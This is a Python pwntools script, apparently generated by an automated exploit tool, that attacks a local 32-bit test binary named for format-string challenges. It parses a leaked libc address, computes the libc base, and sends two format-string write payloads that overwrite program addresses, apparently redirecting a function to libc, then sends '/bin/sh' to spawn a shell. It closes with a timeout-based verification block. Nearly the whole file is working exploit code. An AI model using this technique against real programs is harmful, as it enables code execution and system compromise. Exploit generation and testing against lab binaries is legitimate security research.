from pwn import *

import os
import sf
import sys
import signal

target = process("./chall-test_FmtString-05-x86")
gdb.attach(target, execute="verify_exploit")

bof_payload = sf.BufferOverflow(arch=32)

target.recvuntil("It seems I've been buried alive: ")
leak = int(target.recvline().strip(b"\n"), 16)
libc_base = leak - (344624)
bof_payload.add_base("libc", libc_base)
print("libcBase is: %s" % hex(libc_base))
fs = sf.WriteFmtStr(
		arch = 32,
		value = 0x80491c6,
		address = 0x804b2bc,
		offset = 0x7,
		printed_bytes = 0x0,
		alignment_bytes = 0x0,
		value_base = 0,
		address_base = 0)
payload = fs.generate_fmt_str()
target.sendline(payload)
fs = sf.WriteFmtStr(
		arch = 32,
		value = 0x458b0,
		address = 0x804b2a0,
		offset = 0x7,
		printed_bytes = 0x0,
		alignment_bytes = 0x0,
		value_base = libc_base,
		address_base = 0)
payload = fs.generate_fmt_str()
target.sendline(payload)

target.sendline("/bin/sh\x00")


# Exploit Verification starts here 15935728

def handler(signum, frame):
	raise Exception("Timed out")

signal.signal(signal.SIGALRM, handler)
signal.alarm(2)

try:
	while True:
		target.recvall(timeout=2)
except Exception:
	print("Exploit timed out")
